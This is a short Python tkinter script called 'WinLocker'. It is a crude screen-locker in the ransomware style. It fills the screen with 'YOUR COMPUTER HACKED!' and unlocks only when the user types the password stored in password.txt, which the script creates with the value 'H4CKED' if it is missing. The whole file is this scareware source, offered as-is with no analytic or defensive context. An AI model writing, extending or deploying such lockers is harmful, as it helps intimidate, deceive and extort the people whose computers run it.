from tkinter import *
import os

root = Tk()

class WinLocker(Frame):
	def __init__(self,parent):
		def check_password():
			password = self.entry.get()
			print(password)
			try:
				f = open ("password.txt", "r")
				data = f.read()
			except FileNotFoundError:
				f = open ("password.txt","w")
				f.write("H4CKED")
			finally:
				f = open ("password.txt", "r")
				data = f.read()
			print(data)
			if data == password:
				exit()

		
		super(WinLocker, self).__init__(parent)
		root.attributes('-fullscreen',True)
		self.label = Label(self,text="YOUR COMPUTER HACKED!")
		self.label1 = Label(self,text="WRITE THE PASSWORD!")
		self.button = Button(self,text="CHECK",command=check_password)
		self.entry = Entry(parent,width=100)
		self.entry.insert(0,"Y0UR P4SSW0RD")
		self.entry.pack(padx=20,pady=20)
		self.label.pack(padx=30,pady=30)
		self.label1.pack(padx=10,pady=10)
		self.button.pack(padx=40,pady=40)
		

	
def main():
	main = WinLocker(root)
	main.pack(fill="both",expand=True)


	root.mainloop()

if __name__ == '__main__':
	main()